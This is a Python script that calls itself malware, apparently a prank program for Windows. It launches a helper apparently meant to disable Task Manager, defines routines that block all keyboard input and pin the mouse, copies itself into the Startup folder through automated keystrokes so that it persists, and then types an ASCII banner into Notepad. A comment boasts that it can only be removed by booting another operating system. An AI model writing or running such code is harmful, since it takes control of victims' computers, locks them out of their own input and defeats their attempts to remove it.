# this will make it impossible to shut the malware down unless you access the file
# through a dual boot setup (with linux üëå‚ù§) and delete the file.

import threading
from shutil import copyfile

import pyautogui
import time
import keyboard
import win32clipboard
from pynput.mouse import Controller
from termcolor import colored
import subprocess

ntm = subprocess.Popen(["Documents\\Scripts\\python.exe", "noTaskMgr.py"])


#  definitions
def blockinput():
    global block_input_flag
    block_input_flag = 1
    t1 = threading.Thread(target=blockinput_start)
    t1.start()
    print(colored('[OK] ', 'cyan') + colored('INPUT BLOCKING INSTRUCTED', 'green'))


def unblockinput():
    blockinput_stop()
    print(colored('[OK] ', 'cyan') + colored('INPUT UNBLOCKING INSTRUCTED', 'red'))


def blockinput_start():
    mouse = Controller()
    global block_input_flag
    pyautogui.FAILSAFE = False
    for i in range(150):
        keyboard.block_key(i)
    while block_input_flag == 1:
        mouse.position = (0, 0)


def blockinput_stop():
    global block_input_flag
    for i in range(150):
        keyboard.unblock_key(i)
    block_input_flag = 0


# blockinput()
# time.sleep(5)
# unblockinput()
# Notepad :: pyautogui.write(r"C:\WINDOWS\system32\notepad.exe")
# webbrowser.open('http://sighclone.tech/', new=1)
pyautogui.keyDown('win')
pyautogui.press('r')
pyautogui.keyUp('win')
pyautogui.write('shell:startup')
pyautogui.press('enter')
time.sleep(3)
for i in range(0, 4):
    pyautogui.press('tab')
    time.sleep(0.3)
pyautogui.press('enter')
pyautogui.hotkey('ctrl' + 'c')
win32clipboard.OpenClipboard()
startupPath = win32clipboard.GetClipboardData()
win32clipboard.CloseClipboard()
window = pyautogui.getActiveWindow()
window.close()
copyfile(str(__file__), startupPath)

pyautogui.hotkey('win' + 'r')
pyautogui.write('cmd')
pyautogui.press('enter')
pyautogui.write('C:\\WINDOWS\\system32\\notepad.exe')
pyautogui.press('enter')
pyautogui.hotkey('alt' + 'tab')
pyautogui.write('exit')
pyautogui.press('enter')
pyautogui.write(
    r' ________   ___   ________   ___  ___   ________   ___        ________   ________    _______       ' + '\n' +
    r'|\   ____\ |\  \ |\   ____\ |\  \|\  \ |\   ____\ |\  \      |\   __  \ |\   ___  \ |\  ___ \      ' + '\n' +
    r'\ \  \___|_\ \  \\ \  \___| \ \  \\\  \\ \  \___| \ \  \     \ \  \|\  \\ \  \\ \  \\ \   __/|     ' + '\n' +
    r' \ \_____  \\ \  \\ \  \ ____\ \   __  \\ \  \     \ \  \     \ \  \\\  \\ \  \\ \  \\ \  \_|/__   ' + '\n' +
    r'  \|____|\  \\ \  \\ \  \|_|\\\ \  \ \  \\ \  \____ \ \  \____ \ \  \\\  \\ \  \\ \  \\ \  \_|\ \  ' + '\n' +
    r'    ____\_\  \\ \__\\ \_______\\ \__\ \__\\ \_______\\ \_______\\ \_______\\ \__\\ \__\\ \_______\ ' + '\n' +
    r'   |\_________\\|__| \|_______| \|__|\|__| \|_______| \|_______| \|_______| \|__| \|__| \|_______| ' + '\n' +
    r'   \|_________|                                                                                    '
)

ntm.wait()
